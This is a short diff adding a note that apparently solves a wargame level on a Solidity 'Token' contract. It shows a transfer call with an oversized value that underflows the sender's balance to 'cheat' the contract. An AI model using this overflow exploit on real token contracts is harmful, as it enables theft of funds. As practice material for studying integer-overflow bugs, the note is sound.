@@ -1,0 +1,6 @@
+We will use overflow to cheat on the Token contract.
+
+contract.transfer("0x4897e6f798329e1F87815f250692C9daFB7aD09c", 115792089237316195423570985008687907853269984665640564039457584007913100000000)
+
+Main point is about passing address that is not our own(senders).
+We dont wont this thing to overflow twice.
